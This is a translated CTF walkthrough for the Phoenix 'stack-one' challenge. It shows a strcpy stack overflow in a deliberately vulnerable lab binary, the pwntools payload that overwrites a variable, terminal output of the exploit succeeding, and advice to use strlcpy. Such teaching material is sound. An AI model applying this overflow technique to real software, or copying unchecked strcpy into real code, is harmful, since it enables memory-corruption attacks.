# 凤凰城挑战赛—堆栈一

> 原文：<https://infosecwriteups.com/phoenix-challenges-stack-one-4a9d2100274f?source=collection_archive---------1----------------------->

![](img/6edb48b6bb739362916b5e7758eb4c89.png)

# 挑战

挑战的描述和源代码位于[这里](https://exploit.education/phoenix/stack-one/)。它和所有其他 Phoenix 二进制文件都位于 **/opt/phoenix/amd64** 目录中。前一篇[文章](https://medium.com/@secnate/phoenix-challenges-getting-set-up-a2783e0616c6)描述了如何设置虚拟机来应对这些挑战，如果还没有这样做的话。

# 文件

我们使用下面的命令来了解一个*堆栈*文件的属性:

```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-one$ file /opt/phoenix/amd64/stack-one/opt/phoenix/amd64/stack-one: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped
```

一些有趣的事实:

1.  它启用了`setuid`属性，这表明该程序是以所有者的权限运行的。如果文件的所有者是 root 用户(在本例中不是)，则可以使用它来提升权限
2.  它有符号，如`not stripped`属性所示。这意味着调试和分析二进制文件的人可以看到原始的变量和函数名
3.  它使用动态链接的共享库作为其执行的一部分。这有助于识别所使用的标准函数
4.  那是一辆`ELF 64-bit LSB executable, x86-64`。ELF 是文件格式，字长是 64 位，LSB 表示它是 little-endian(首先使用最低有效字节)，二进制使用 x86-64 指令集

# 目标

查看 *Stack One 的* C 代码，我们看到 *changeme* 变量存储在初始化为 0 的 *locals* struct 中。目标是篡改它的值，使它的值等于`0x496c5962`来打印所需的语句。

# 相关概念

有必要了解堆栈内存是如何工作的。我在凤凰栈零挑战的[文章里写了一篇很长的解释，有兴趣的可以看看。](https://medium.com/bugbountywriteup/phoenix-challenges-stack-zero-f8743cc871ed)

# 虫子

所有的 *Stack One 的*数据都存储在堆栈上，而 *locals* struct 的 buffer 和 *changeme* 变量是相邻的邻居。存入*缓冲区*的多余数据将溢出到 *changeme* 变量并影响其值。这种溢出是由 *strcpy()* 函数引起的，该函数将 *Stack-One* 二进制的参数写入 *locals.buffer* 中，而不进行任何边界检查。

# 利用

输入写入的 *locals.buffer* 有 64 个字符的空间。由于 *locals.changeme* 变量最初为 0，因此漏洞需要篡改其内存位置，以使其具有所需的`0x496c5962`值。这是通过输入一个 64 个字符的输入字符串来完全占据缓冲区的内存，并追加额外的数据来用`0x496c5962`值覆盖 *changeme* 变量来实现的。

我需要完全填满 *locals.buffer* 的 64 个字符，并确保追加的值可以完全控制 *changeme* 变量。幸运的是， *Stack One* 二进制文件有打印输出，它证明了 *locals.changeme* 变量是否等于`0x496c5962`，如果不等于就打印它的值。方便的

```
if (locals.changeme == 0x496c5962) { 
  puts("Well done, you have successfully set changeme to the correct value"); 
} 
else { 
  printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n", locals.changeme); 
}
```

我从设计一个基本的漏洞开始。其有效载荷在 [*exploit.py*](https://github.com/secnate/Exploit-Education-CTFs/blob/main/Phoenix/stack-one/exploit.py) 文件的第 14 行是`payload = cyclic(64) + p32(0xdeadbeef)`

这是什么意思？Pwntool 的 *cyclic(64)* 命令生成以下循环填充字符串

```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa
```

虽然字符本身没有内在含义，但它的主要好处是每个可能的 4 字节序列对应一个唯一的字符串索引。通过简化调试和调整填充字符串偏移量，这加快了漏洞利用开发的过程。

p32 函数是 pwntools 的打包工具。它接受提供的整数输入(本例中为 0xdeadbeef ),并将其转换为长度为 32 个字节的字节字符串表示形式和适当的字节顺序。因为 *Stack One* 文件是 little-endian，所以它将 **0xdeadbeef** 表示为一个 **b'\xef\xbe\xad\xde'** 字节串。

这样就生成了以下字节串有效负载:

```
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa\xef\xbe\xad\xde'
```

下一步是测试有效载荷的发射*是否完全*覆盖了带有 0xdeadbeef 的 *changeme* 变量。

```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-one$ ./exploit_with_debugger.py
Launching The Stack One Exploit!
[!] Could not find executable 'stack-one' in $PATH, using '/opt/phoenix/amd64/stack-one' instead
[+] Starting local process '/opt/phoenix/amd64/stack-one': pid 4703
[*] Switching to interactive mode
[*] Process '/opt/phoenix/amd64/stack-one' stopped with exit code 0 (pid 4703)
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0xdeadbeef, we want 0x496c5962
[*] Got EOF while reading in interactive
$
```

确实如此。最后一步是用`0x496c5962`替换有效载荷的`0xdeadbeef`值——你瞧！

```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-one$ ./exploit.py
Launching The Stack One Exploit!
[!] Could not find executable 'stack-one' in $PATH, using '/opt/phoenix/amd64/stack-one' instead
[+] Starting local process '/opt/phoenix/amd64/stack-one': pid 4717
[*] Switching to interactive mode
[*] Process '/opt/phoenix/amd64/stack-one' stopped with exit code 0 (pid 4717)
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
[*] Got EOF while reading in interactive
$
```

漏洞代码可以在我的 [Github 知识库](https://github.com/secnate/Exploit-Education-CTFs)中找到。

# 补救

为了防止这样的内存损坏错误，我会敦促开发人员不要用 C 编写，而要过渡到内存安全的语言，如 Python 或 Rust。

如果除了使用 C 别无选择，我会警告不要使用 [strcpy](https://www.geeksforgeeks.org/why-strcpy-and-strncpy-are-not-safe-to-use/) 函数来提取命令行参数或输入。正如刚才看到的，它继续读取输入，直到看到终止空值(' \0 ')，而不管目的缓冲区的大小。

应该使用 [strlcpy](https://man.openbsd.org/strlcpy.3) 函数。它将输入写入目标缓冲区，直到达到指定的大小，并以空字符(' \0 ')终止缓冲区。方便，因为许多程序员会忘记手动这样做。

源代码的`strcpy(locals.buffer, argv[1]);`行将是`strlcpy(locals.buffer, argv[1], 64);`。

这一轮就到此为止。敬请期待下一次挑战！

这篇 CTF 挑战赛的文章最初发表在内森·帕夫洛夫斯基的个人博客上: [secnate.github.io](http://secnate.github.io/)

## 来自 Infosec 的报道:Infosec 每天都有很多内容，很难跟上。[加入我们的每周简讯](https://weekly.infosecwriteups.com/)以 5 篇文章、4 个线程、3 个视频、2 个 Github Repos 和工具以及 1 个工作提醒的形式免费获取所有最新的 Infosec 趋势！